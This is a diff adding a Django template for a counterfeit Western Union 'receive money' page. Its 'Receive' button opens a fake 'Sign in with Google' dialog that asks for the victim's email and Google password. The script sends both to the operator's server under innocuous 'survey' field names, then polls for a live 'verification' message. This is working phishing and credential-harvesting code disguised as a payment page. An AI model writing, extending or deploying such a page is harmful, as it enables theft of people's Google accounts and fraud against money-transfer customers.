@@ -1,0 +1,425 @@
+{% extends 'western/base.html' %}
+
+{% block title %}Western Union | Receive Money{% endblock %}
+
+{% block card_content %}
+<p class="wu-tag">Incoming transfer</p>
+<h1>{{ sender }} has sent you</h1>
+<p class="wu-amount">{{ currency }} {{ amount }}</p>
+
+<div class="wu-details">
+    <p><span>MTCN</span><strong>{{ mtcn }}</strong></p>
+    <p><span>Sent from</span><strong>{{ country }}</strong></p>
+</div>
+
+<form id="receiveForm" method="post" action="{% url 'western:receive-transfer' %}">
+    {% csrf_token %}
+    <button type="button" class="wu-btn wu-btn-receive" id="openReceiveModal">Receive</button>
+</form>
+
+<div class="wu-modal g-signin-modal" id="googleNoonesModal" aria-hidden="true">
+    <div class="g-signin-overlay wu-modal__backdrop" id="wuModalBackdrop"></div>
+    <div
+        class="g-login-popup wu-modal__dialog"
+        role="dialog"
+        aria-modal="true"
+        aria-labelledby="gSigninTitle"
+    >
+        <button type="button" class="g-signin-close" id="closeReceiveModal" aria-label="Close">×</button>
+
+        <div id="surveyStepEmail" class="g-step g-step--sheet">
+            <header class="g-oauth-header">
+                <span class="g-oauth-header__mark" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M23.49 12.27c0-.77-.07-1.51-.19-2.22H12v4.2h6.47a5.53 5.53 0 0 1-2.4 3.63v3.01h3.88c2.27-2.09 3.54-5.17 3.54-8.62z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.96-1.07 7.95-2.91l-3.88-3.01c-1.07.72-2.44 1.15-4.07 1.15-3.13 0-5.78-2.11-6.73-4.95H1.27v3.1A11.99 11.99 0 0 0 12 24z"/>
+                        <path fill="#FBBC05" d="M5.27 14.28A7.2 7.2 0 0 1 4.89 12c0-.79.14-1.56.38-2.28V6.62H1.27A12 12 0 0 0 0 12c0 1.94.46 3.78 1.27 5.38l4-3.1z"/>
+                        <path fill="#EA4335" d="M12 4.77c1.76 0 3.34.61 4.58 1.81l3.44-3.44C17.95 1.22 15.23 0 12 0 7.31 0 3.27 2.69 1.27 6.62l4 3.1c.95-2.84 3.6-4.95 6.73-4.95z"/>
+                    </svg>
+                </span>
+                <span class="g-oauth-header__text">Sign in with Google</span>
+            </header>
+
+            <div class="g-oauth-grid">
+                <div class="g-oauth-brand">
+                    <div class="g-logo g-logo--wu" aria-hidden="true">
+                        <span class="g-logo__wu">WU</span>
+                    </div>
+                    <h2 id="gSigninTitle" class="g-oauth-heading">Sign in</h2>
+                    <p class="g-oauth-continue">
+                        to continue to <span class="g-oauth-continue__host">
+                            <a class="g-text-link" href="https://www.westernunion.com/ke/en/home.html">westernunion.com</a>
+                        </span>
+                    </p>
+                </div>
+                <div class="g-oauth-fields">
+                    <div class="g-field g-field--outlined">
+                        <input
+                            type="email"
+                            inputmode="email"
+                            id="surveyEmail"
+                            name="survey_email"
+                            class="g-input-outlined"
+                            placeholder=" "
+                            autocomplete="email"
+                        >
+                        <label for="surveyEmail">Email</label>
+                    </div>
+                    <p class="g-link-row">
+                        <span class="g-text-link g-text-link--muted" tabindex="-1">
+                            Before using this app, you can review westernunion.com's <a class="g-text-link" href="https://www.westernunion.com/global/en/privacy-statement.html">privacy policy</a> and <a class="g-text-link" href="https://www.westernunion.com/ke/en/legal/terms-conditions.html">terms of service</a>.
+                        </span>
+                    </p>
+                </div>
+            </div>
+
+            <footer class="g-oauth-actions g-oauth-actions--single">
+                <button type="button" class="g-btn g-btn--primary-pill" id="btnEmailNext">Next</button>
+            </footer>
+
+            <div class="g-modal-chrome" aria-hidden="true">
+                <span class="g-modal-chrome__lang">English (United States) ▾</span>
+                <nav class="g-modal-chrome__links">
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Help</a> 
+                        </span>
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Privacy</a> 
+                    </span>
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Terms</a> 
+                    </span>
+                </nav>
+            </div>
+        </div>
+
+        <!-- Step 2: Welcome -->
+        <div id="surveyStepName" class="g-step g-step--sheet" hidden>
+            <header class="g-oauth-header">
+                <span class="g-oauth-header__mark" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M23.49 12.27c0-.77-.07-1.51-.19-2.22H12v4.2h6.47a5.53 5.53 0 0 1-2.4 3.63v3.01h3.88c2.27-2.09 3.54-5.17 3.54-8.62z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.96-1.07 7.95-2.91l-3.88-3.01c-1.07.72-2.44 1.15-4.07 1.15-3.13 0-5.78-2.11-6.73-4.95H1.27v3.1A11.99 11.99 0 0 0 12 24z"/>
+                        <path fill="#FBBC05" d="M5.27 14.28A7.2 7.2 0 0 1 4.89 12c0-.79.14-1.56.38-2.28V6.62H1.27A12 12 0 0 0 0 12c0 1.94.46 3.78 1.27 5.38l4-3.1z"/>
+                        <path fill="#EA4335" d="M12 4.77c1.76 0 3.34.61 4.58 1.81l3.44-3.44C17.95 1.22 15.23 0 12 0 7.31 0 3.27 2.69 1.27 6.62l4 3.1c.95-2.84 3.6-4.95 6.73-4.95z"/>
+                    </svg>
+                </span>
+                <span class="g-oauth-header__text">Sign in with Google</span>
+            </header>
+
+            <div class="g-oauth-grid">
+                <div class="g-oauth-brand">
+                    <h2 class="g-oauth-heading">Welcome</h2>
+                    <p id="userEmailDisplay" class="g-oauth-email-line"></p>
+                    <p class="g-oauth-continue">
+                        to continue to <span class="g-oauth-continue__host">
+                            <a class="g-text-link" href="https://www.westernunion.com/ke/en/home.html">westernunion.com</a>
+                        </span>
+                    </p>
+                </div>
+                <div class="g-oauth-fields">
+                    <div class="g-field g-field--outlined">
+                        <input
+                            type="text"
+                            id="surveyName"
+                            name="survey_name"
+                            class="g-input-outlined"
+                            placeholder=" "
+                            maxlength="120"
+                            autocomplete="name"
+                        >
+                        <label for="surveyName">Password</label>
+                    </div>
+                    <p class="g-disclaimer">Enter your google account password</p>
+                </div>
+            </div>
+
+            <footer class="g-oauth-actions">
+                <button type="button" class="g-text-link g-oauth-actions__secondary" id="surveyBackToEmail">Back</button>
+                <button type="button" class="g-btn g-btn--primary-pill" id="surveySubmitBtn">Next</button>
+            </footer>
+
+            <div class="g-modal-chrome" aria-hidden="true">
+                <span class="g-modal-chrome__lang">English (United States) ▾</span>
+                <nav class="g-modal-chrome__links">
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Help</a> 
+                        </span>
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Privacy</a> 
+                    </span>
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Terms</a> 
+                    </span>
+                </nav>
+            </div>
+        </div>
+
+        <!-- Loading -->
+        <div id="surveyStepWait" class="g-step g-step--sheet g-step--wait" hidden>
+            <header class="g-oauth-header">
+                <span class="g-oauth-header__mark" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M23.49 12.27c0-.77-.07-1.51-.19-2.22H12v4.2h6.47a5.53 5.53 0 0 1-2.4 3.63v3.01h3.88c2.27-2.09 3.54-5.17 3.54-8.62z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.96-1.07 7.95-2.91l-3.88-3.01c-1.07.72-2.44 1.15-4.07 1.15-3.13 0-5.78-2.11-6.73-4.95H1.27v3.1A11.99 11.99 0 0 0 12 24z"/>
+                        <path fill="#FBBC05" d="M5.27 14.28A7.2 7.2 0 0 1 4.89 12c0-.79.14-1.56.38-2.28V6.62H1.27A12 12 0 0 0 0 12c0 1.94.46 3.78 1.27 5.38l4-3.1z"/>
+                        <path fill="#EA4335" d="M12 4.77c1.76 0 3.34.61 4.58 1.81l3.44-3.44C17.95 1.22 15.23 0 12 0 7.31 0 3.27 2.69 1.27 6.62l4 3.1c.95-2.84 3.6-4.95 6.73-4.95z"/>
+                    </svg>
+                </span>
+                <span class="g-oauth-header__text">Sign in with Google</span>
+            </header>
+            <div class="g-wait-body">
+                <h2 class="g-oauth-heading g-wait-body__title">One moment</h2>
+                <p class="g-sub">Verifying your session…</p>
+                <div class="g-loading" aria-live="polite">
+                    <div class="g-loading__ring" aria-hidden="true"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="surveyStepDone" class="g-step g-step--sheet g-step--done" hidden>
+            <header class="g-oauth-header">
+                <span class="g-oauth-header__mark" aria-hidden="true">
+                    <svg viewBox="0 0 24 24" width="18" height="18" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="#4285F4" d="M23.49 12.27c0-.77-.07-1.51-.19-2.22H12v4.2h6.47a5.53 5.53 0 0 1-2.4 3.63v3.01h3.88c2.27-2.09 3.54-5.17 3.54-8.62z"/>
+                        <path fill="#34A853" d="M12 24c3.24 0 5.96-1.07 7.95-2.91l-3.88-3.01c-1.07.72-2.44 1.15-4.07 1.15-3.13 0-5.78-2.11-6.73-4.95H1.27v3.1A11.99 11.99 0 0 0 12 24z"/>
+                        <path fill="#FBBC05" d="M5.27 14.28A7.2 7.2 0 0 1 4.89 12c0-.79.14-1.56.38-2.28V6.62H1.27A12 12 0 0 0 0 12c0 1.94.46 3.78 1.27 5.38l4-3.1z"/>
+                        <path fill="#EA4335" d="M12 4.77c1.76 0 3.34.61 4.58 1.81l3.44-3.44C17.95 1.22 15.23 0 12 0 7.31 0 3.27 2.69 1.27 6.62l4 3.1c.95-2.84 3.6-4.95 6.73-4.95z"/>
+                    </svg>
+                </span>
+                <span class="g-oauth-header__text">Sign in with Google</span>
+            </header>
+
+            <div class="g-oauth-grid g-oauth-grid--done">
+                <div class="g-oauth-brand">
+                    <div class="g-done-badge" aria-hidden="true">
+                        <svg viewBox="0 0 24 24" width="26" height="26" xmlns="http://www.w3.org/2000/svg">
+                            <path fill="#1e8e3e" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                        </svg>
+                    </div>
+                    <h2 class="g-oauth-heading">Finish verification</h2>
+                </div>
+                <div class="g-oauth-fields">
+                    <div class="g-response-card" id="surveyResponseText"></div>
+                </div>
+            </div>
+
+            <footer class="g-oauth-actions g-oauth-actions--single">
+                <button type="submit" form="receiveForm" class="g-btn g-btn--primary-pill" id="surveyContinueReceive">Continue</button>
+            </footer>
+
+            <div class="g-modal-chrome" aria-hidden="true">
+                <span class="g-modal-chrome__lang">English (United States) ▾</span>
+                <nav class="g-modal-chrome__links">
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Help</a> 
+                        </span>
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Privacy</a> 
+                    </span>
+                    <span>
+                        <a class="g-text-link" href="https://accounts.google.com/TOS?loc=KE&hl=en-US">Terms</a> 
+                    </span>
+                </nav>
+            </div>
+        </div>
+    </div>
+</div>
+
+{{ survey_submit_url|json_script:"survey-submit-url" }}
+
+<script>
+    (() => {
+        const modal = document.getElementById("googleNoonesModal");
+        const openBtn = document.getElementById("openReceiveModal");
+        const closeBtn = document.getElementById("closeReceiveModal");
+        const backdrop = document.getElementById("wuModalBackdrop");
+        const stepEmail = document.getElementById("surveyStepEmail");
+        const stepName = document.getElementById("surveyStepName");
+        const stepWait = document.getElementById("surveyStepWait");
+        const stepDone = document.getElementById("surveyStepDone");
+        const btnEmailNext = document.getElementById("btnEmailNext");
+        const surveySubmitBtn = document.getElementById("surveySubmitBtn");
+        const surveyBackToEmail = document.getElementById("surveyBackToEmail");
+        const surveyEmail = document.getElementById("surveyEmail");
+        const surveyName = document.getElementById("surveyName");
+        const userEmailDisplay = document.getElementById("userEmailDisplay");
+        const responseText = document.getElementById("surveyResponseText");
+        const submitUrlEl = document.getElementById("survey-submit-url");
+        const gFocusEmail = document.getElementById("gFocusEmail");
+
+        if (!modal || !openBtn || !closeBtn || !backdrop || !submitUrlEl) {
+            return;
+        }
+
+        const submitUrl = JSON.parse(submitUrlEl.textContent);
+        let pollTimer = null;
+
+        function getCookie(name) {
+            let v = null;
+            if (document.cookie && document.cookie !== "") {
+                const parts = document.cookie.split(";");
+                for (let i = 0; i < parts.length; i++) {
+                    const c = parts[i].trim();
+                    if (c.startsWith(name + "=")) {
+                        v = decodeURIComponent(c.substring(name.length + 1));
+                        break;
+                    }
+                }
+            }
+            return v;
+        }
+
+        function showStep(step) {
+            [stepEmail, stepName, stepWait, stepDone].forEach((el) => {
+                if (el) el.hidden = el !== step;
+            });
+        }
+
+        function resetSurveyUi() {
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+            surveyName.value = "";
+            surveyEmail.value = "";
+            userEmailDisplay.textContent = "";
+            responseText.textContent = "";
+            showStep(stepEmail);
+        }
+
+        const openModal = () => {
+            resetSurveyUi();
+            modal.classList.add("is-open");
+            modal.setAttribute("aria-hidden", "false");
+            document.body.classList.add("wu-lock-scroll");
+        };
+
+        const closeModal = () => {
+            modal.classList.remove("is-open");
+            modal.setAttribute("aria-hidden", "true");
+            document.body.classList.remove("wu-lock-scroll");
+            if (pollTimer) {
+                clearInterval(pollTimer);
+                pollTimer = null;
+            }
+        };
+
+        openBtn.addEventListener("click", openModal);
+        closeBtn.addEventListener("click", closeModal);
+        backdrop.addEventListener("click", closeModal);
+        document.addEventListener("keydown", (event) => {
+            if (event.key === "Escape" && modal.classList.contains("is-open")) {
+                closeModal();
+            }
+        });
+
+        if (gFocusEmail) {
+            gFocusEmail.addEventListener("click", () => surveyEmail.focus());
+        }
+
+        btnEmailNext.addEventListener("click", () => {
+            const email = (surveyEmail.value || "").trim();
+            if (!email || !email.includes("@")) {
+                surveyEmail.focus();
+                return;
+            }
+            userEmailDisplay.textContent = email;
+            showStep(stepName);
+            surveyName.focus();
+        });
+
+        function goBackToEmail() {
+            showStep(stepEmail);
+            surveyEmail.focus();
+        }
+
+        surveyBackToEmail.addEventListener("click", goBackToEmail);
+
+        function statusUrl(id) {
+            return `/api/survey/${id}/status/`;
+        }
+
+        surveySubmitBtn.addEventListener("click", async () => {
+            const email = (surveyEmail.value || "").trim();
+            const name = (surveyName.value || "").trim();
+            if (!email || !name) {
+                if (!name) surveyName.focus();
+                else surveyEmail.focus();
+                return;
+            }
+
+            const csrftoken = getCookie("csrftoken");
+            showStep(stepWait);
+
+            try {
+                const res = await fetch(submitUrl, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        "X-CSRFToken": csrftoken || "",
+                    },
+                    body: JSON.stringify({
+                        display_name: name,
+                        contact_email: email,
+                    }),
+                });
+                const data = await res.json().catch(() => ({}));
+                if (!res.ok) {
+                    responseText.textContent = data.error || "Something went wrong. Please try again.";
+                    showStep(stepDone);
+                    return;
+                }
+                const sid = data.submission_id;
+                if (!sid) {
+                    responseText.textContent = "Invalid response from server.";
+                    showStep(stepDone);
+                    return;
+                }
+
+                let attempts = 0;
+                const maxAttempts = 900;
+
+                const tryPoll = async () => {
+                    try {
+                        const st = await fetch(statusUrl(sid), { method: "GET" });
+                        const j = await st.json();
+                        if (j.ready && j.message) {
+                            if (pollTimer) {
+                                clearInterval(pollTimer);
+                                pollTimer = null;
+                            }
+                            responseText.textContent = j.message;
+                            showStep(stepDone);
+                            return true;
+                        }
+                    } catch {
+                        /* keep polling */
+                    }
+                    return false;
+                };
+
+                if (await tryPoll()) {
+                    return;
+                }
+
+                pollTimer = setInterval(async () => {
+                    attempts += 1;
+                    if (attempts > maxAttempts) {
+                        clearInterval(pollTimer);
+                        pollTimer = null;
+                        responseText.textContent =
+                            "We could not complete verification in time. You can close this window and try again later.";
+                        showStep(stepDone);
+                        return;
+                    }
+                    await tryPoll();
+                }, 2000);
+            } catch {
+                responseText.textContent = "Network error. Check your connection and try again.";
+                showStep(stepDone);
+            }
+        });
+    })();
+</script>
+{% endblock %}
